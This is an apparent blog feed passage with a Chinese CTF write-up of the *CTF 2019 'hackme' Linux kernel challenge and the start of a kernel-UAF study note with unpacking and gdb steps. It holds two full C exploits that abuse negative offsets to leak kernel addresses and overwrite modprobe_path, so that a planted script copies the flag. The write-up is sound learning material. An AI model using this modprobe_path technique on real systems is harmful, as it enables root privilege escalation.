<code>copy_from_user</code> 函数向堆块中写入数据。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102156379.png" alt="image-20230410215619344"></p><h4 id="show">show</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102220490.png" alt="image-20230410222056453"></p><p>如上图所示， <code>v5[1]</code> 是 <code>idx</code> 对应堆块的 <code>size</code> ，这里的 <code>offset+size</code> 只判断了是否小于 <code>v5[1]</code> ，但是忘记判断了 <code>offset+size</code> 要大于 <code>0</code>，所以这里的 <code>offset</code> 可以为负值，如果 <code>offset</code> 为负数的话，就导致了 <code>offset+chunk_addr</code> 拷贝的并不是当前指定的堆块中数据，可能是上一个堆块（低地址处）的数据，在这个 <code>show</code> 部分相当于任意地址读</p><h4 id="edit">edit</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102228740.png" alt="image-20230410222823697"></p><p>和上面 <code>show</code> 部分的漏洞一样， <code>offset</code> 值可以为负，从而可以任意地址写。</p><h3 id="利用思路">利用思路</h3><p><code>slub</code> 分配器是 <code>Linux</code> 内核中的一种内存分配器,其分配原理和 <code>fastbin</code> 原理类似，不过这里分配的堆块没有堆块头，也就是不加 <code>0x10</code> ，申请多少就是多少。</p><p>利用思路就是类似于 <code>fastbin attack</code> 的手法，数组索引向上（低地址）溢出，覆盖 <code>fd</code> 指针，从而实现任意地址申请和泄露。首先去泄露出内核基地址，然后加上 <code>mod_tree</code> 在内核中的偏移（ <code>mod_tree</code> 在内核中，而里面有模块的指针，所以通常我们用它来泄露出模块的基地址）得到 <code>mod_tree</code> 地址，将其申请出来，泄露出模块的基地址。有了模块的地址，我们就可以将 <code>pool</code> 数组申请出来写入 <code>modprobe_path</code> 指针（该指针在内核中），用 <code>edit</code> 功能实现任意地址写（我猜测无法直接将 <code>fd</code> 指针控制为 <code>modprobe_path</code> 申请出来然后写入数据的原因是这样会破坏原本内核中的堆结构，如果利用 <code>pool</code> 数组任意写的话，可以将之前的堆结构再恢复）</p><p>上面的过程和做 <code>glibc</code> 堆题的思想基本一致，具体过程就不再赘述。</p><p>但我一直不明白为什么我的脚本会导致内核崩溃，就是执行完篡改 <code>modprobe_path</code> 都没有崩溃，可以看到下图是改写成功的</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172038840.png" alt="image-20230417202505374"></p><p>此时也没有崩溃，但是再返回到用户态调用函数或者再运行一次脚本，内核就会崩溃重启。</p><p>可能是我破坏了某些堆结构？可是我将之前全部破坏的指针又用任意地址写恢复了，emmm 因为是完全自己写的，所以可能是某个奇奇怪怪的地方搞坏了，不过最终思想是没问题的，因为确实是成功改掉了路径。</p><p>下面放一下我这个会崩溃的 <code>EXP</code> … 也算记录一下</p><h3 id="EXP">EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> index;</span><br><span class="line">    <span class="type">size_t</span> *user_ptr;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=<span class="number">0</span>;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size,<span class="type">size_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=<span class="number">0</span>;</span><br><span class="line">    data.offset=<span class="number">0</span>;</span><br><span class="line">    data.user_ptr=<span class="literal">NULL</span>;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size,<span class="type">size_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">char</span> *mem=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    add(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    show(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x1e0</span>);</span><br><span class="line">    write(<span class="number">1</span>,mem,<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> kernel_address = *((<span class="type">size_t</span> *)mem);  </span><br><span class="line">    <span class="type">size_t</span> leak_heap = *((<span class="type">size_t</span> *)(mem+<span class="number">0x20</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak kernel address %llx\n&quot;</span>,kernel_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak heap address 0x%llx\n&quot;</span>,leak_heap);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_base=kernel_address<span class="number">-0x847240</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base %llx\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="type">size_t</span> mod_tree=kernel_base+<span class="number">0x811000</span>+<span class="number">0x100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mod tree %llx\n&quot;</span>,mod_tree);</span><br><span class="line">    add(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    delete(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//attack</span></span><br><span class="line">    edit(fd,<span class="number">1</span>,&amp;mod_tree,<span class="number">0x200</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">    add(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    add(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    show(fd,<span class="number">3</span>,mem,<span class="number">0x110</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> hackme_base = *((<span class="type">size_t</span> *)(mem+<span class="number">8</span>))<span class="number">-0x2320</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hackme_base %llx\n&quot;</span>,hackme_base); </span><br><span class="line">    <span class="type">size_t</span> pool=hackme_base+<span class="number">0x2400</span>+<span class="number">0xc0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pool address %llx\n&quot;</span>,pool);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    add(fd,<span class="number">4</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    add(fd,<span class="number">5</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    delete(fd,<span class="number">4</span>);</span><br><span class="line">    <span class="type">size_t</span> modprobe_math=kernel_base+<span class="number">0x83f960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_math %llx\n&quot;</span>,modprobe_math);</span><br><span class="line">    edit(fd,<span class="number">5</span>,&amp;pool,<span class="number">0x240</span>,<span class="number">-0x200</span>);</span><br><span class="line">    add(fd,<span class="number">6</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">int</span> fake_size=<span class="number">0x200</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)mem)=modprobe_math;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">8</span>))=fake_size;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x10</span>))=leak_heap+<span class="number">0x1b0</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x18</span>))=fake_size;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x20</span>))=leak_heap+<span class="number">0xe02bfb0</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x28</span>))=fake_size;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(fd,<span class="number">7</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">char</span> *str=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> data1=leak_heap+<span class="number">0x3b0</span>;</span><br><span class="line">    <span class="type">size_t</span> data2=leak_heap+<span class="number">0xe02c3b0</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(str,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak heap address 0x%llx\n&quot;</span>,leak_heap);</span><br><span class="line">    edit(fd,<span class="number">0xc</span>,str,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line">    edit(fd,<span class="number">0xd</span>,&amp;data1,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    edit(fd,<span class="number">0xe</span>,&amp;data2,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/sir&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/sir&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    system(<span class="string">&quot;/home/pwn/sir&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是 <a href="http://p4nda.top/">P4nda</a> 师傅的脚本，我和他的思路差不多</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC 0x30000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x30001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE 0x30002</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">size_t</span> idx;</span><br><span class="line"><span class="type">void</span> *addr;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> len;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">cmd.idx = idx;</span><br><span class="line">cmd.len = len;</span><br><span class="line">cmd.addr = user;</span><br><span class="line">ioctl(fd,ALLOC,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">cmd.idx = idx;</span><br><span class="line">ioctl(fd,DEL,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_from_kernel</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len,<span class="type">long</span> <span class="type">long</span> offset)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">cmd.idx = idx;</span><br><span class="line">cmd.len = len;</span><br><span class="line">cmd.addr = user;</span><br><span class="line">cmd.offset = offset;</span><br><span class="line">ioctl(fd,READ,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to_kernel</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len,<span class="type">long</span> <span class="type">long</span> offset)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">cmd.idx = idx;</span><br><span class="line">cmd.len = len;</span><br><span class="line">cmd.addr = user;</span><br><span class="line">cmd.offset = offset;</span><br><span class="line">ioctl(fd,WRITE,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">( <span class="type">char</span> *buf,<span class="type">int</span> size)</span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;(size/<span class="number">8</span>);i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i/<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>,*(<span class="type">size_t</span> * )(buf + i*<span class="number">8</span>));</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="type">size_t</span> heap_addr , kernel_addr,mod_addr;</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] bad open /dev/hackme\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(fd,<span class="number">1</span>);</span><br><span class="line">delete(fd,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_from_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">heap_addr = *((<span class="type">size_t</span>  *)mem);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] heap addr : %16llx\n&quot;</span>,heap_addr );</span><br><span class="line">read_from_kernel(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x200</span>);</span><br><span class="line">kernel_addr = *((<span class="type">size_t</span>  *)(mem+<span class="number">0x28</span>)) ;</span><br><span class="line"><span class="keyword">if</span> ((kernel_addr &amp; <span class="number">0xfff</span>) != <span class="number">0xae0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] maybe bad kernel leak : %16llx\n&quot;</span>,kernel_addr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kernel_addr -= <span class="number">0x849ae0</span>; <span class="comment">//0x849ae0 - sysctl_table_root</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kernel addr : %16llx\n&quot;</span>,kernel_addr );</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">*((<span class="type">size_t</span> *)mem) = (<span class="number">0x811000</span> + kernel_addr + <span class="number">0x40</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">alloc(fd,<span class="number">5</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">6</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">read_from_kernel(fd,<span class="number">6</span>,mem,<span class="number">0x40</span>,<span class="number">-0x40</span>);</span><br><span class="line">mod_addr =  *((<span class="type">size_t</span>  *)(mem+<span class="number">0x18</span>)) ;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] mod addr : %16llx\n&quot;</span>,mod_addr );</span><br><span class="line"></span><br><span class="line">delete(fd,<span class="number">2</span>);</span><br><span class="line">delete(fd,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">*((<span class="type">size_t</span> *)mem) = (<span class="number">0x2400</span> + mod_addr + <span class="number">0xc0</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">7</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">*((<span class="type">size_t</span> *)(mem+<span class="number">0x8</span>)) = <span class="number">0x100</span>; </span><br><span class="line">*((<span class="type">size_t</span> *)mem) = (<span class="number">0x83f960</span> + kernel_addr ); <span class="comment">//ffffffff8183f960 D modprobe_path</span></span><br><span class="line">alloc(fd,<span class="number">8</span>,mem,<span class="number">0x100</span>); <span class="comment">// pool</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>(mem,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line">write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172129949.png" alt="image-20230417212958765" style="zoom:50%;" /><h2 id="参考文章">参考文章</h2><p><a href="https://blog.csdn.net/yongbaoii/article/details/123583502">(47条消息) linux kernal pwn STARCTF 2019 hackme（一） 劫持modprobe_path_yongbaoii的博客-CSDN博客</a></p><p><a href="https://kileak.github.io/ctf/2019/xctf-hackme/">XCTF - *CTF 2019 - hack_me | kileak</a></p><p><a href="http://p4nda.top/2019/05/01/starctf-2019-hackme/">(<em>´∇｀</em>) 天亮了~ 【KERNEL PWN】STARCTF 2019 hackme 解题思路 | p4nda’s blog</a></p><p>[<a href="https://bbs.kanxue.com/thread-254178.htm">原创]Linux Kernel Exploit 内核漏洞学习(4)-RW Any Memory-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p><p><a href="https://www.secpulse.com/archives/153929.html">基于modprobe_path覆盖的Linux内核漏洞利用技术 - SecPulse.COM | 安全脉搏</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel-RW Any Memory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于 kernel-UAF 的学习总结</title>
      <link href="/posts/406ce0e2.html"/>
      <url>/posts/406ce0e2.html</url>
      
        <content type="html"><![CDATA[<p>终于来到了关于内核的学习，目前打算浅尝一下内核的基础知识和漏洞。之后每个学习的新漏洞都单独写一篇文章，每篇学到的新的前置知识都放到对应的文章中吧，暂时先不做汇总。</p><h3 id="CISCN2017-Pwn-babydriver">CISCN2017_Pwn_babydriver</h3><h4 id="前置知识">前置知识</h4><p>将 <code>rootfs.cpio</code> 文件系统映像解包，因为静态分析需要解包得到的 <code>ko</code> 文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hen rootfs.cpio</span><br></pre></td></tr></table></figure><p>解包脚本 <code>hen</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> <span class="variable">$1</span>.gz</span><br><span class="line">unar <span class="variable">$1</span>.gz</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> core</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span>.gz <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+]Successful&quot;</span></span><br></pre></td></tr></table></figure><p>打包脚本 <code>gen</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span> </span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> ..</span><br></pre></td></tr></table></figure><p>使用下面的命令，从 <code>bzImage</code> 文件中提取 <code>vmlinux</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><h5 id="调试">调试</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gdb vmlinux</span><br></pre></td></tr></table></figure><p>下面的命令导入符号表，这个 <code>ko</code> 文件是刚刚解压 <code>rootfs.cpio</code> 得到的，后面这个 <code>0xffffffffc0000000</code> 需要在启动内核后，输入 <code>lsmod</code> 查看驱动的基地址从而得到。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add-symbol-file /home/zikh/Desktop/babydriver/core/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure><p>最后用下面的命令连接，调试程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261609913.png" alt="image-20230326160909064"></p><p>设置断点需要用驱动的基地址加上 <code>ida</code> 中的偏移的位置打断点即可，这个基地址仅仅是和 <code>text</code> 段的地址相同，假设你现在想查看 <code>bss</code> 段上的某个变量，那么需要获取到 <code>bss</code> 段的基地址以及变量在 <code>bss</code> 段上的偏移。</p><p>假设要查看 <code>0xd90</code> 这个地址装载到内存中的实际地址。首先获取它在 <code>bss</code> 段上的偏移，发现 <code>bss</code> 段基地址为 <code>0xd00</code> 因此这个地址在 <code>bss</code> 段上偏移为 <code>0x90</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270841264.png" alt="image-20230327084110128" style="zoom: 50%;" /><p>获取 <code>bss</code> 段的基地址 （如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270843604.png" alt="image-20230327084300554"></p><p>因此 <code>babydevice_t</code> 结构体地址是 <code>0xffffffffc00024d0</code> ，验证如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270853716.png" alt="image-20230327085333674"></p><h5 id="内核提权">内核提权</h5><p>如果攻击者能够修改某个进程中的 <code>cred</code> 结构体中的 <code>gid</code> 和 